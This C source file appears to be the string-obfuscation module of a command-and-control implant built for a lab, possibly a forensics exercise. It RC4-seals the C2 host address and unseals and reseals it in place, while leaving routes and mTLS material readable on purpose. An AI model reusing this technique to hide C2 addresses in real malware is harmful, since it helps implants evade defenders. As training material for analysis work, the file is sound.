#include "obfuscate.h"

#include <stddef.h>

#define SEAL_KEY "ksnftc-lab-instance"

/* Only the C2 address is RC4-sealed; routes and the mTLS material stay
 * in plain runtime storage so forensic traces remain readable. */
#define SEALED_STRING STR_HOST
#define N_STRINGS 6
#define N_BLOBS 3
#define MAX_STRING 64
#define MAX_BLOB 8192

/* generated by scripts/embed_worker.py; the host record is writable
 * because unsealing happens in place (see obfuscate.h) */
extern unsigned char seal_strings[N_STRINGS][MAX_STRING];
extern const unsigned int seal_string_lens[N_STRINGS];
extern unsigned char plain_strings[N_STRINGS][MAX_STRING];
extern const unsigned int plain_string_lens[N_STRINGS];
extern unsigned char plain_blobs[N_BLOBS][MAX_BLOB];
extern const unsigned int plain_blob_lens[N_BLOBS];

static unsigned char string_live;


static void rc4(const unsigned char *key, size_t key_len,
                const unsigned char *in, size_t len, unsigned char *out)
{
    unsigned char state[256], swap;
    unsigned int i = 0, j = 0, k;

    for (k = 0; k < 256; k++)
        state[k] = (unsigned char)k;
    for (k = 0; k < 256; k++) {
        j = (j + state[k] + key[k % key_len]) & 255;
        swap = state[k]; state[k] = state[j]; state[j] = swap;
    }
    i = 0;
    j = 0;
    for (k = 0; k < len; k++) {
        i = (i + 1) & 255;
        j = (j + state[i]) & 255;
        swap = state[i]; state[i] = state[j]; state[j] = swap;
        out[k] = in[k] ^ state[(state[i] + state[j]) & 255];
    }
}

/* RC4 with a fresh keystream is an involution: the same call both
 * unseals and reseals the host record in its own storage. */
static void toggle(unsigned char *record, size_t len)
{
    static const unsigned char *key =
        (const unsigned char *)SEAL_KEY;

    rc4(key, sizeof(SEAL_KEY) - 1, record, len, record);
}

const char *agent_unseal_string(enum agent_string_id id)
{
    if (id == SEALED_STRING && !string_live) {
        toggle(seal_strings[id], seal_string_lens[id]);
        string_live = 1;
        return (const char *)seal_strings[id];
    }
    if (id == SEALED_STRING)
        return (const char *)seal_strings[id];
    return (const char *)plain_strings[id];
}

const unsigned char *agent_unseal_blob(enum agent_blob_id id, size_t *len)
{
    *len = plain_blob_lens[id];
    return plain_blobs[id];
}

void agent_reseal(void)
{
    if (string_live) {
        toggle(seal_strings[SEALED_STRING],
               seal_string_lens[SEALED_STRING]);
        string_live = 0;
    }
}
